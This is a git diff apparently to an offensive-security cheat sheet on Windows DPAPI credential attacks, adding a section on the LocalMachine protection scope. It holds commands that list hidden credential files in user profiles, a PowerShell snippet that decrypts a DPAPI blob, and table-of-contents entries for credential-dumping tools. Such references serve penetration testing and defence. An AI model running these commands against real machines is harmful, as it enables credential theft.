@@ -6,6 +6,7 @@
 
 * [Data Protection API](#data-protection-api)
     * [List Credential Files](#list-credential-files)
+    * [DPAPI LocalMachine Context](#dpapi-localmachine-context)
     * [Mimikatz - Credential Manager & DPAPI](#mimikatz---credential-manager--dpapi)
     * [Hekatomb - Steal all credentials on domain](#hekatomb---steal-all-credentials-on-domain)
     * [DonPAPI - Dumping DPAPI credz remotely](#donpapi---dumping-dpapi-credz-remotely)
@@ -34,6 +35,19 @@ dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 
 Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+```
+
+
+### DPAPI LocalMachine Context
+
+The `LocalMachine` context is used to protect data that is intended to be shared across different users or services on a single machine. This means that any user or service running on the machine can access the protected data with the appropriate credentials.
+
+In contrast, the `CurrentUser` context is used to protect data that is intended to be accessed only by the user who encrypted it, and cannot be accessed by other users or services on the same machine.
+
+```ps1
+$a = [System.Convert]::FromBase64String("AQAAANCMnd[...]")
+$b = [System.Security.Cryptography.ProtectedData]::Unprotect($a, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine)
+[System.Text.Encoding]::ASCII.GetString($b)
 ```
 
 
